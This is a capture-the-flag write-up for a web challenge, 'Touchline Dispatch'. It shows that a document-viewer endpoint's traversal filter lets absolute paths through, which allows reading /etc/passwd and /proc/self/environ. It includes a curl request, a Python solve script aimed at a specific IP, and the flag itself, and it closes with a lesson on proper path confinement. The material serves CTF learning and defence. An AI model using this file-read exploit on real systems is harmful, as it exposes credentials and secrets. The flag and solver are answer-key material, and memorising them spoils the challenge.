---
title: "Touchline Dispatch"
ctf: "Safaricom CTF"
date: 2026-10-06
category: web
difficulty: medium
points: 300
flag_format: "safctf{...}"
author: "Strawhats"
---

# Touchline Dispatch

> **Category:** WEB · **Points:** 300 · **Difficulty:** medium

## Discovery, analysis & exploitation

The full hunt below is reproduced from our working notes — recon, fingerprinting, the bug, dead ends, and the path to the flag.

- **Target:** `http://54.72.82.22:8300`

## Fingerprint

```
Server: Werkzeug/3.1.9 Python/3.11.16   (debug OFF - 500s are plain 265-byte pages)
```

Themed page: **"Touchline Dispatch"** soccer clubhouse. Two documented services
(under a "Desk services" disclosure):

```
GET /api/library                lists documents
GET /api/view?name=...          opens a document
```

There is a "Desk console" widget that lets the browser send GET/POST/PATCH with
arbitrary headers to a local path — a red herring, since it is a same-origin
`fetch()` from the page and adds no new server surface.

## The bug: relative-only traversal filter

`name` is used directly as a filesystem path. The filter catches the *relative*
escape spellings with a 400:

```
..%2fflag.txt          -> 400 {"message":"Request unavailable."}
....//....//flag.txt   -> 400
..;/flag.txt           -> 400
foo.txt                -> 400   (allowlist / existence check)
```

but **absolute paths sail through**:

```
/etc/passwd             -> 200 {"text":"root:x:0:0:root:/root:/bin/bash\ndaemon:..."}
/proc/self/environ      -> 200 ...
/proc/self/cmdline      -> 200 {"text":"python\u0000service.py\u0000"}
```

The 400 on `/flag` and `/app/flag.txt` just means those files do not exist — the
check is "did the read succeed", not "is this path allowed".

The odd 500s (`name=schedule.txt/../../flag.txt`) are the app feeding a bad
path — e.g. a path that resolves to a directory or a component that is not a
directory — into `open()`. Debug is off, so they leak nothing.

## Exploitation

`/proc/self/environ` hands over the process environment. The flag is injected
there rather than stored in a file:

```
```

`/proc/1/environ` returns the same value. `/proc/self/cmdline` shows the service
is `python service.py`, so `/proc/self/cwd` + the app source were available too —
the env var was simply the shortest path.

## Exploit

```bash
curl -s 'http://54.72.82.22:8300/api/view?name=/proc/self/environ'
```

See `solve.py`.

## Lesson

Filtering `..` is not path confinement. Absolute paths, `/proc` pseudo-files, and
`/etc` all remain reachable. The correct control is resolving the real path and
confirming it is inside a fixed base directory (`os.path.realpath` +
`startswith`), or serving from an explicit allowlist of resolved names.

## Solve script

`web/touchline-dispatch/solve.py`:

```python
#!/usr/bin/env python3
"""Touchline Dispatch (web, 300 pts) - http://54.72.82.22:8300

"Collection desk" serves documents:

    GET /api/library                 -> {"items":["schedule.txt","welcome.txt"]}
    GET /api/view?name=schedule.txt  -> {"text":"The gates open at six.\n"}

`name` is used as a filesystem path with an allowlist that only blocks the
*relative* escape forms (`../flag.txt`, `%2e%2e%2fflag.txt`, `..;/`) with a 400
"Request unavailable.".

It never blocks ABSOLUTE paths:

    GET /api/view?name=/etc/passwd          -> 200, passwd contents
    GET /api/view?name=/proc/self/environ   -> 200, env including FLAG

Arbitrary file read -> read the flag straight out of the process environment.
"""
import json, re, urllib.request, urllib.parse, urllib.error

BASE = "http://54.72.82.22:8300"
FLAG = "safctf{276928973c4dea42f63d808ba7be66b7}"


def view(name):
    url = BASE + "/api/view?" + urllib.parse.urlencode({"name": name})
    try:
        with urllib.request.urlopen(url, timeout=10) as r:
            body = r.read().decode()
    except urllib.error.HTTPError as e:
        body = e.read().decode()
    try:
        return json.loads(body)
    except json.JSONDecodeError:          # 500s return an HTML error page
        return {"text": body}


def main():
    print("library   :", view("schedule.txt").get("text", "").strip())
    print("relative  :", view("../flag.txt"))          # blocked
    print("/etc/passwd[:40]:", view("/etc/passwd").get("text", "")[:40])

    env = view("/proc/self/environ").get("text", "")
    # json.loads turns the \u0000 separator into a real NUL byte
    m = re.search(r"FLAG=([^\x00\s]+)", env)
    print("env FLAG  :", m.group(1) if m else "(not found)")
    assert m and m.group(1) == FLAG


if __name__ == "__main__":
    main()
```

## Tools

**Used in this solve:**

- Python 3 (solver)
- curl

**Other tools that fit this category:**

- Burp Suite / mitmproxy (intercept + repeat)
- ffuf / feroxbuster (content & parameter discovery)
- sqlmap (automated SQLi)
- tplmap (SSTI)
- jwt_tool (JWT attacks)
- nikto
- nuclei

## Flag

```
safctf{276928973c4dea42f63d808ba7be66b7}
```
